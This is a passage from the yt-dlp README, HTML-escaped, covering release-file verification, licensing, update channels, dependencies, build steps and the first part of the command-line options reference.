 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.tar.gz"&gt;yt-dlp.tar.gz&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Source tarball&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-512SUMS"&gt;SHA2-512SUMS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;GNU-style SHA512 sums&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-512SUMS.sig"&gt;SHA2-512SUMS.sig&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;GPG signature file for SHA512 sums&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS"&gt;SHA2-256SUMS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;GNU-style SHA256 sums&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS.sig"&gt;SHA2-256SUMS.sig&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;GPG signature file for SHA256 sums&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;The public key that can be used to verify the GPG signatures is &lt;a href="https://github.com/yt-dlp/yt-dlp/raw/master/public.key"&gt;available here&lt;/a&gt; Example usage:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;curl -L https://github.com/yt-dlp/yt-dlp/raw/master/public.key | gpg --import
gpg --verify SHA2-256SUMS.sig SHA2-256SUMS
gpg --verify SHA2-512SUMS.sig SHA2-512SUMS
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Licensing&lt;/h4&gt; 
&lt;p&gt;While yt-dlp is licensed under the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/LICENSE"&gt;Unlicense&lt;/a&gt;, many of the release files contain code from other projects with different licenses.&lt;/p&gt; 
&lt;p&gt;Most notably, the PyInstaller-bundled executables include GPLv3+ licensed code, and as such the combined work is licensed under &lt;a href="https://www.gnu.org/licenses/gpl-3.0.html"&gt;GPLv3+&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The zipimport Unix executable (&lt;code&gt;yt-dlp&lt;/code&gt;) contains &lt;a href="https://github.com/meriyah/meriyah/raw/main/LICENSE.md"&gt;ISC&lt;/a&gt; licensed code from &lt;a href="https://github.com/meriyah/meriyah"&gt;&lt;code&gt;meriyah&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://github.com/davidbonnet/astring/raw/main/LICENSE"&gt;MIT&lt;/a&gt; licensed code from &lt;a href="https://github.com/davidbonnet/astring"&gt;&lt;code&gt;astring&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/THIRD_PARTY_LICENSES.txt"&gt;THIRD_PARTY_LICENSES.txt&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;The git repository, the source tarball (&lt;code&gt;yt-dlp.tar.gz&lt;/code&gt;), the PyPI source distribution and the PyPI built distribution (wheel) only contain code licensed under the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/LICENSE"&gt;Unlicense&lt;/a&gt;.&lt;/p&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: The manpages, shell completion (autocomplete) files etc. are available inside the &lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.tar.gz"&gt;source tarball&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;UPDATE&lt;/h2&gt; 
&lt;p&gt;You can use &lt;code&gt;yt-dlp -U&lt;/code&gt; to update if you are using the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#release-files"&gt;release binaries&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;If you &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Installation#with-pip"&gt;installed with pip&lt;/a&gt;, simply re-run the same command that was used to install the program&lt;/p&gt; 
&lt;p&gt;For other third-party package managers, see &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Installation#third-party-package-managers"&gt;the wiki&lt;/a&gt; or refer to their documentation&lt;/p&gt; 
&lt;p&gt;&lt;a id="update-channels"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;There are currently three release channels for binaries: &lt;code&gt;stable&lt;/code&gt;, &lt;code&gt;nightly&lt;/code&gt; and &lt;code&gt;master&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;stable&lt;/code&gt; is the default channel, and many of its changes have been tested by users of the &lt;code&gt;nightly&lt;/code&gt; and &lt;code&gt;master&lt;/code&gt; channels.&lt;/li&gt; 
 &lt;li&gt;The &lt;code&gt;nightly&lt;/code&gt; channel has releases scheduled to build every day around midnight UTC, for a snapshot of the project's new patches and changes. This is the &lt;strong&gt;recommended channel for regular users&lt;/strong&gt; of yt-dlp. The &lt;code&gt;nightly&lt;/code&gt; releases are available from &lt;a href="https://github.com/yt-dlp/yt-dlp-nightly-builds/releases"&gt;yt-dlp/yt-dlp-nightly-builds&lt;/a&gt; or as development releases of the &lt;code&gt;yt-dlp&lt;/code&gt; PyPI package (which can be installed with pip's &lt;code&gt;--pre&lt;/code&gt; flag).&lt;/li&gt; 
 &lt;li&gt;The &lt;code&gt;master&lt;/code&gt; channel features releases that are built after each push to the master branch, and these will have the very latest fixes and additions, but may also be more prone to regressions. They are available from &lt;a href="https://github.com/yt-dlp/yt-dlp-master-builds/releases"&gt;yt-dlp/yt-dlp-master-builds&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;When using &lt;code&gt;--update&lt;/code&gt;/&lt;code&gt;-U&lt;/code&gt;, a release binary will only update to its current channel. &lt;code&gt;--update-to CHANNEL&lt;/code&gt; can be used to switch to a different channel when a newer version is available. &lt;code&gt;--update-to [CHANNEL@]TAG&lt;/code&gt; can also be used to upgrade or downgrade to specific tags from a channel.&lt;/p&gt; 
&lt;p&gt;You may also use &lt;code&gt;--update-to &amp;lt;repository&amp;gt;&lt;/code&gt; (&lt;code&gt;&amp;lt;owner&amp;gt;/&amp;lt;repository&amp;gt;&lt;/code&gt;) to update to a channel on a completely different repository. Be careful with what repository you are updating to though, there is no verification done for binaries from different repositories.&lt;/p&gt; 
&lt;p&gt;Example usage:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;yt-dlp --update-to master&lt;/code&gt; switch to the &lt;code&gt;master&lt;/code&gt; channel and update to its latest release&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;yt-dlp --update-to stable@2023.07.06&lt;/code&gt; upgrade/downgrade to release to &lt;code&gt;stable&lt;/code&gt; channel tag &lt;code&gt;2023.07.06&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;yt-dlp --update-to 2023.10.07&lt;/code&gt; upgrade/downgrade to tag &lt;code&gt;2023.10.07&lt;/code&gt; if it exists on the current channel&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;yt-dlp --update-to example/yt-dlp@2023.09.24&lt;/code&gt; upgrade/downgrade to the release from the &lt;code&gt;example/yt-dlp&lt;/code&gt; repository, tag &lt;code&gt;2023.09.24&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Any user experiencing an issue with the &lt;code&gt;stable&lt;/code&gt; release should install or update to the &lt;code&gt;nightly&lt;/code&gt; release before submitting a bug report:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;# To update to nightly from stable executable/binary:
yt-dlp --update-to nightly

# To install nightly with pip:
python -m pip install -U --pre "yt-dlp[default]"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;When running a yt-dlp version that is older than 90 days, you will see a warning message suggesting to update to the latest version. You can suppress this warning by adding &lt;code&gt;--no-update&lt;/code&gt; to your command or configuration file.&lt;/p&gt; 
&lt;h2&gt;DEPENDENCIES&lt;/h2&gt; 
&lt;p&gt;Python versions 3.10+ (CPython) and 3.11+ (PyPy) are supported. Other versions and implementations may or may not work correctly.&lt;/p&gt; 
&lt;!-- Python 3.5+ uses VC++14 and it is already embedded in the binary created
&lt;!x-- https://www.microsoft.com/en-us/download/details.aspx?id=26999 --x&gt;
On Windows, [Microsoft Visual C++ 2010 SP1 Redistributable Package (x86)](https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe) is also necessary to run yt-dlp. You probably already have this, but if the executable throws an error due to missing `MSVCR100.dll` you need to install it manually.
--&gt; 
&lt;p&gt;While all the other dependencies are optional, &lt;code&gt;ffmpeg&lt;/code&gt;, &lt;code&gt;ffprobe&lt;/code&gt;, &lt;code&gt;yt-dlp-ejs&lt;/code&gt; and a supported JavaScript runtime/engine are highly recommended&lt;/p&gt; 
&lt;h3&gt;Strongly recommended&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.ffmpeg.org"&gt;&lt;strong&gt;ffmpeg&lt;/strong&gt; and &lt;strong&gt;ffprobe&lt;/strong&gt;&lt;/a&gt; - Required for &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#format-selection"&gt;merging separate video and audio files&lt;/a&gt;, as well as for various &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#post-processing-options"&gt;post-processing&lt;/a&gt; tasks. License &lt;a href="https://www.ffmpeg.org/legal.html"&gt;depends on the build&lt;/a&gt;&lt;/p&gt; &lt;p&gt;There are bugs in ffmpeg that cause various issues when used alongside yt-dlp. Since ffmpeg is such an important dependency, we provide &lt;a href="https://github.com/yt-dlp/FFmpeg-Builds#ffmpeg-static-auto-builds"&gt;custom builds&lt;/a&gt; with patches for some of these issues at &lt;a href="https://github.com/yt-dlp/FFmpeg-Builds"&gt;yt-dlp/FFmpeg-Builds&lt;/a&gt;. See &lt;a href="https://github.com/yt-dlp/FFmpeg-Builds#patches-applied"&gt;the readme&lt;/a&gt; for details on the specific issues solved by these builds&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: What you need is ffmpeg &lt;em&gt;binary&lt;/em&gt;, &lt;strong&gt;NOT&lt;/strong&gt; &lt;a href="https://pypi.org/project/ffmpeg"&gt;the Python package of the same name&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/yt-dlp/ejs"&gt;&lt;strong&gt;yt-dlp-ejs&lt;/strong&gt;&lt;/a&gt; - Required for full YouTube support. Licensed under &lt;a href="https://github.com/yt-dlp/ejs/raw/main/LICENSE"&gt;Unlicense&lt;/a&gt;, bundles &lt;a href="https://github.com/davidbonnet/astring/raw/main/LICENSE"&gt;MIT&lt;/a&gt; and &lt;a href="https://github.com/meriyah/meriyah/raw/main/LICENSE.md"&gt;ISC&lt;/a&gt; components.&lt;/p&gt; &lt;p&gt;A JavaScript runtime/engine like &lt;a href="https://deno.land"&gt;&lt;strong&gt;deno&lt;/strong&gt;&lt;/a&gt; (recommended), &lt;a href="https://nodejs.org"&gt;&lt;strong&gt;node.js&lt;/strong&gt;&lt;/a&gt;, &lt;a href="https://bun.sh"&gt;&lt;strong&gt;bun&lt;/strong&gt;&lt;/a&gt;, or &lt;a href="https://bellard.org/quickjs/"&gt;&lt;strong&gt;QuickJS&lt;/strong&gt;&lt;/a&gt; is also required to run yt-dlp-ejs. See &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/EJS"&gt;the wiki&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Networking&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/certifi/python-certifi"&gt;&lt;strong&gt;certifi&lt;/strong&gt;&lt;/a&gt;* - Provides Mozilla's root certificate bundle. Licensed under &lt;a href="https://github.com/certifi/python-certifi/raw/master/LICENSE"&gt;MPLv2&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/google/brotli"&gt;&lt;strong&gt;brotli&lt;/strong&gt;&lt;/a&gt;* or &lt;a href="https://github.com/python-hyper/brotlicffi"&gt;&lt;strong&gt;brotlicffi&lt;/strong&gt;&lt;/a&gt; - &lt;a href="https://en.wikipedia.org/wiki/Brotli"&gt;Brotli&lt;/a&gt; content encoding support. Both licensed under MIT &lt;sup&gt;&lt;a href="https://github.com/google/brotli/raw/master/LICENSE"&gt;1&lt;/a&gt; &lt;a href="https://github.com/python-hyper/brotlicffi/raw/master/LICENSE"&gt;2&lt;/a&gt; &lt;/sup&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/aaugustin/websockets"&gt;&lt;strong&gt;websockets&lt;/strong&gt;&lt;/a&gt;* - For downloading over websocket. Licensed under &lt;a href="https://github.com/aaugustin/websockets/raw/main/LICENSE"&gt;BSD-3-Clause&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/psf/requests"&gt;&lt;strong&gt;requests&lt;/strong&gt;&lt;/a&gt;* - HTTP library. For HTTPS proxy and persistent connections support. Licensed under &lt;a href="https://github.com/psf/requests/raw/main/LICENSE"&gt;Apache-2.0&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Impersonation&lt;/h4&gt; 
&lt;p&gt;The following provide support for impersonating browser requests. This may be required for some sites that employ TLS fingerprinting.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/lexiforest/curl_cffi"&gt;&lt;strong&gt;curl_cffi&lt;/strong&gt;&lt;/a&gt; (recommended) - Python binding for &lt;a href="https://github.com/lexiforest/curl-impersonate"&gt;curl-impersonate&lt;/a&gt;. Provides impersonation targets for Chrome, Edge and Safari. Licensed under &lt;a href="https://github.com/lexiforest/curl_cffi/raw/main/LICENSE"&gt;MIT&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Can be installed with the &lt;code&gt;curl-cffi&lt;/code&gt; extra, e.g. &lt;code&gt;pip install "yt-dlp[default,curl-cffi]"&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;Currently included in most builds &lt;em&gt;except&lt;/em&gt; &lt;code&gt;yt-dlp&lt;/code&gt; (Unix zipimport binary), &lt;code&gt;yt-dlp_x86&lt;/code&gt; (Windows 32-bit) and &lt;code&gt;yt-dlp_musllinux_aarch64&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Metadata&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/quodlibet/mutagen"&gt;&lt;strong&gt;mutagen&lt;/strong&gt;&lt;/a&gt;* - For &lt;code&gt;--embed-thumbnail&lt;/code&gt; in certain formats. Licensed under &lt;a href="https://github.com/quodlibet/mutagen/raw/master/COPYING"&gt;GPLv2+&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/wez/atomicparsley"&gt;&lt;strong&gt;AtomicParsley&lt;/strong&gt;&lt;/a&gt; - For &lt;code&gt;--embed-thumbnail&lt;/code&gt; in &lt;code&gt;mp4&lt;/code&gt;/&lt;code&gt;m4a&lt;/code&gt; files when &lt;code&gt;mutagen&lt;/code&gt;/&lt;code&gt;ffmpeg&lt;/code&gt; cannot. Licensed under &lt;a href="https://github.com/wez/atomicparsley/raw/master/COPYING"&gt;GPLv2+&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/xattr/xattr"&gt;&lt;strong&gt;xattr&lt;/strong&gt;&lt;/a&gt;, &lt;a href="https://github.com/iustin/pyxattr"&gt;&lt;strong&gt;pyxattr&lt;/strong&gt;&lt;/a&gt; or &lt;a href="http://savannah.nongnu.org/projects/attr"&gt;&lt;strong&gt;setfattr&lt;/strong&gt;&lt;/a&gt; - For writing xattr metadata (&lt;code&gt;--xattrs&lt;/code&gt;) on &lt;strong&gt;Mac&lt;/strong&gt; and &lt;strong&gt;BSD&lt;/strong&gt;. Licensed under &lt;a href="https://github.com/xattr/xattr/raw/master/LICENSE.txt"&gt;MIT&lt;/a&gt;, &lt;a href="https://github.com/iustin/pyxattr/raw/master/COPYING"&gt;LGPL2.1&lt;/a&gt; and &lt;a href="http://git.savannah.nongnu.org/cgit/attr.git/tree/doc/COPYING"&gt;GPLv2+&lt;/a&gt; respectively&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Misc&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Legrandin/pycryptodome"&gt;&lt;strong&gt;pycryptodomex&lt;/strong&gt;&lt;/a&gt;* - For decrypting AES-128 HLS streams and various other data. Licensed under &lt;a href="https://github.com/Legrandin/pycryptodome/raw/master/LICENSE.rst"&gt;BSD-2-Clause&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ariya/phantomjs"&gt;&lt;strong&gt;phantomjs&lt;/strong&gt;&lt;/a&gt; - Used in some extractors where JavaScript needs to be run. No longer used for YouTube. To be deprecated in the near future. Licensed under &lt;a href="https://github.com/ariya/phantomjs/raw/master/LICENSE.BSD"&gt;BSD-3-Clause&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/mitya57/secretstorage"&gt;&lt;strong&gt;secretstorage&lt;/strong&gt;&lt;/a&gt;* - For &lt;code&gt;--cookies-from-browser&lt;/code&gt; to access the &lt;strong&gt;Gnome&lt;/strong&gt; keyring while decrypting cookies of &lt;strong&gt;Chromium&lt;/strong&gt;-based browsers on &lt;strong&gt;Linux&lt;/strong&gt;. Licensed under &lt;a href="https://github.com/mitya57/secretstorage/raw/master/LICENSE"&gt;BSD-3-Clause&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Any external downloader that you want to use with &lt;code&gt;--downloader&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Deprecated&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="http://rtmpdump.mplayerhq.hu"&gt;&lt;strong&gt;rtmpdump&lt;/strong&gt;&lt;/a&gt; - For downloading &lt;code&gt;rtmp&lt;/code&gt; streams. ffmpeg can be used instead with &lt;code&gt;--downloader ffmpeg&lt;/code&gt;. Licensed under &lt;a href="http://rtmpdump.mplayerhq.hu"&gt;GPLv2+&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://mplayerhq.hu/design7/info.html"&gt;&lt;strong&gt;mplayer&lt;/strong&gt;&lt;/a&gt; or &lt;a href="https://mpv.io"&gt;&lt;strong&gt;mpv&lt;/strong&gt;&lt;/a&gt; - For downloading &lt;code&gt;rstp&lt;/code&gt;/&lt;code&gt;mms&lt;/code&gt; streams. ffmpeg can be used instead with &lt;code&gt;--downloader ffmpeg&lt;/code&gt;. Licensed under &lt;a href="https://github.com/mpv-player/mpv/raw/master/Copyright"&gt;GPLv2+&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;To use or redistribute the dependencies, you must agree to their respective licensing terms.&lt;/p&gt; 
&lt;p&gt;The standalone release binaries are built with the Python interpreter and the packages marked with &lt;strong&gt;*&lt;/strong&gt; included.&lt;/p&gt; 
&lt;p&gt;If you do not have the necessary dependencies for a task you are attempting, yt-dlp will warn you. All the currently available dependencies are visible at the top of the &lt;code&gt;--verbose&lt;/code&gt; output&lt;/p&gt; 
&lt;h2&gt;COMPILE&lt;/h2&gt; 
&lt;h3&gt;Standalone PyInstaller Builds&lt;/h3&gt; 
&lt;p&gt;To build the standalone executable, you must have Python and &lt;code&gt;pyinstaller&lt;/code&gt; (plus any of yt-dlp's &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#dependencies"&gt;optional dependencies&lt;/a&gt; if needed). The executable will be built for the same CPU architecture as the Python used.&lt;/p&gt; 
&lt;p&gt;You can run the following commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;python devscripts/install_deps.py --include-extra pyinstaller
python devscripts/make_lazy_extractors.py
python -m bundle.pyinstaller
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;On some systems, you may need to use &lt;code&gt;py&lt;/code&gt; or &lt;code&gt;python3&lt;/code&gt; instead of &lt;code&gt;python&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;python -m bundle.pyinstaller&lt;/code&gt; accepts any arguments that can be passed to &lt;code&gt;pyinstaller&lt;/code&gt;, such as &lt;code&gt;--onefile/-F&lt;/code&gt; or &lt;code&gt;--onedir/-D&lt;/code&gt;, which is further &lt;a href="https://pyinstaller.org/en/stable/usage.html#what-to-generate"&gt;documented here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Pyinstaller versions below 4.4 &lt;a href="https://github.com/pyinstaller/pyinstaller#requirements-and-tested-platforms"&gt;do not support&lt;/a&gt; Python installed from the Windows store without using a virtual environment.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Running &lt;code&gt;pyinstaller&lt;/code&gt; directly &lt;strong&gt;instead of&lt;/strong&gt; using &lt;code&gt;python -m bundle.pyinstaller&lt;/code&gt; is &lt;strong&gt;not&lt;/strong&gt; officially supported. This may or may not work correctly.&lt;/p&gt; 
&lt;h3&gt;Platform-independent Binary (UNIX)&lt;/h3&gt; 
&lt;p&gt;You will need the build tools &lt;code&gt;python&lt;/code&gt; (3.10+), &lt;code&gt;zip&lt;/code&gt;, &lt;code&gt;make&lt;/code&gt; (GNU), &lt;code&gt;pandoc&lt;/code&gt;* and &lt;code&gt;pytest&lt;/code&gt;*.&lt;/p&gt; 
&lt;p&gt;After installing these, simply run &lt;code&gt;make&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;You can also run &lt;code&gt;make yt-dlp&lt;/code&gt; instead to compile only the binary without updating any of the additional files. (The build tools marked with &lt;strong&gt;*&lt;/strong&gt; are not needed for this)&lt;/p&gt; 
&lt;h3&gt;Related scripts&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;devscripts/install_deps.py&lt;/code&gt;&lt;/strong&gt; - Install dependencies for yt-dlp.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;devscripts/update-version.py&lt;/code&gt;&lt;/strong&gt; - Update the version number based on the current date.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;devscripts/set-variant.py&lt;/code&gt;&lt;/strong&gt; - Set the build variant of the executable.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;devscripts/make_changelog.py&lt;/code&gt;&lt;/strong&gt; - Create a markdown changelog using short commit messages and update &lt;code&gt;CONTRIBUTORS&lt;/code&gt; file.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;devscripts/make_lazy_extractors.py&lt;/code&gt;&lt;/strong&gt; - Create lazy extractors. Running this before building the binaries (any variant) will improve their startup performance. Set the environment variable &lt;code&gt;YTDLP_NO_LAZY_EXTRACTORS&lt;/code&gt; to something nonempty to forcefully disable lazy extractor loading.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Note: See their &lt;code&gt;--help&lt;/code&gt; for more info.&lt;/p&gt; 
&lt;h3&gt;Forking the project&lt;/h3&gt; 
&lt;p&gt;If you fork the project on GitHub, you can run your fork's &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/.github/workflows/build.yml"&gt;build workflow&lt;/a&gt; to automatically build the selected version(s) as artifacts. Alternatively, you can run the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/.github/workflows/release.yml"&gt;release workflow&lt;/a&gt; or enable the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/.github/workflows/release-nightly.yml"&gt;nightly workflow&lt;/a&gt; to create full (pre-)releases.&lt;/p&gt; 
&lt;h1&gt;USAGE AND OPTIONS&lt;/h1&gt; 
&lt;!-- MANPAGE: BEGIN EXCLUDED SECTION --&gt; 
&lt;pre&gt;&lt;code&gt;yt-dlp [OPTIONS] [--] URL [URL...]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Tip: Use &lt;code&gt;CTRL&lt;/code&gt;+&lt;code&gt;F&lt;/code&gt; (or &lt;code&gt;Command&lt;/code&gt;+&lt;code&gt;F&lt;/code&gt;) to search by keywords&lt;/p&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;!-- Auto generated --&gt; 
&lt;h2&gt;General Options:&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;-h, --help                      Print this help text and exit
--version                       Print program version and exit
-U, --update                    Update this program to the latest version
--no-update                     Do not check for updates (default)
--update-to [CHANNEL]@[TAG]     Upgrade/downgrade to a specific version.
                                CHANNEL can be a repository as well. CHANNEL
                                and TAG default to "stable" and "latest"
                                respectively if omitted; See "UPDATE" for
                                details. Supported channels: stable,
                                nightly, master
-i, --ignore-errors             Ignore download and postprocessing errors.
                                The download will be considered successful
                                even if the postprocessing fails
--no-abort-on-error             Continue with next video on download errors;
                                e.g. to skip unavailable videos in a
                                playlist (default)
--abort-on-error                Abort downloading of further videos if an
                                error occurs (Alias: --no-ignore-errors)
--list-extractors               List all supported extractors and exit
--extractor-descriptions        Output descriptions of all supported
                                extractors and exit
--use-extractors NAMES          Extractor names to use separated by commas.
                                You can also use regexes, "all", "default"
                                and "end" (end URL matching); e.g. --ies
                                "holodex.*,end,youtube". Prefix the name
                                with a "-" to exclude it, e.g. --ies
                                default,-generic. Use --list-extractors for
                                a list of extractor names. (Alias: --ies)
--default-search PREFIX         Use this prefix for unqualified URLs. E.g.
                                "gvsearch2:python" downloads two videos from
                                google videos for the search term "python".
                                Use the value "auto" to let yt-dlp guess
                                ("auto_warning" to emit a warning when
                                guessing). "error" just throws an error. The
                                default value "fixup_error" repairs broken
                                URLs, but emits an error if this is not
                                possible instead of searching
--ignore-config                 Don't load any more configuration files
                                except those given to --config-locations.
                                For backward compatibility, if this option
                                is found inside the system configuration
                                file, the user configuration is not loaded.
                                (Alias: --no-config)
--no-config-locations           Do not load any custom configuration files
                                (default). When given inside a configuration
                                file, ignore all previous --config-locations
                                defined in the current file
--config-locations PATH         Location of the main configuration file;
                                either the path to the config or its
                                containing directory ("-" for stdin). Can be
                                used multiple times and inside other
                                configuration files
--plugin-dirs DIR               Path to an additional directory to search
                                for plugins. This option can be used
                                multiple times to add multiple directories.
                                Use "default" to search the default plugin
                                directories (default)
--no-plugin-dirs                Clear plugin directories to search,
                                including defaults and those provided by
                                previous --plugin-dirs
--js-runtimes RUNTIME[:PATH]    Additional JavaScript runtime to enable,
                                with an optional location for the runtime
                                (either the path to the binary or its
                                containing directory). This option can be
                                used multiple times to enable multiple
                                runtimes. Supported runtimes are (in order
                                of priority, from highest to lowest): deno,
                                node, quickjs, bun. Only "deno" is enabled
                                by default. The highest priority runtime
                                that is both enabled and available will be
                                used. In order to use a lower priority
                                runtime when "deno" is available, --no-js-
                                runtimes needs to be passed before enabling
                                other runtimes
--no-js-runtimes                Clear JavaScript runtimes to enable,
                                including defaults and those provided by
                                previous --js-runtimes
--remote-components COMPONENT   Remote components to allow yt-dlp to fetch
                                when required. This option is currently not
                                needed if you are using an official
                                executable or have the requisite version of
                                the yt-dlp-ejs package installed. You can
                                use this option multiple times to allow
                                multiple components. Supported values:
                                ejs:npm (external JavaScript components from
                                npm), ejs:github (external JavaScript
                                components from yt-dlp-ejs GitHub). By
                                default, no remote components are allowed
--no-remote-components          Disallow fetching of all remote components,
                                including any previously allowed by
                                --remote-components or defaults.
--flat-playlist                 Do not extract a playlist's URL result
                                entries; some entry metadata may be missing
                                and downloading may be bypassed
--no-flat-playlist              Fully extract the videos of a playlist
                                (default)
--live-from-start               Download livestreams from the start.
                                Currently experimental and only supported
                                for YouTube and Twitch
--no-live-from-start            Download livestreams from the current time
                                (default)
--wait-for-video MIN[-MAX]      Wait for scheduled streams to become
                                available. Pass the minimum number of
                                seconds (or range) to wait between retries
--no-wait-for-video             Do not wait for scheduled streams (default)
--mark-watched                  Mark videos watched (even with --simulate)
--no-mark-watched               Do not mark videos watched (default)
--color [STREAM:]POLICY         Whether to emit color codes in output,
                                optionally prefixed by the STREAM (stdout or
                                stderr) to apply the setting to. Can be one
                                of "always", "auto" (default), "never", or
                                "no_color" (use non color terminal
                                sequences). Use "auto-tty" or "no_color-tty"
                                to decide based on terminal support only.
                                Can be used multiple times
--compat-options OPTS           Options that can help keep compatibility
                                with youtube-dl or youtube-dlc
                                configurations by reverting some of the
                                changes made in yt-dlp. See "Differences in
                                default behavior" for details
--alias ALIASES OPTIONS         Create aliases for an option string. Unless
                                an alias starts with a dash "-", it is
                                prefixed with "--". Arguments are parsed
                                according to the Python string formatting
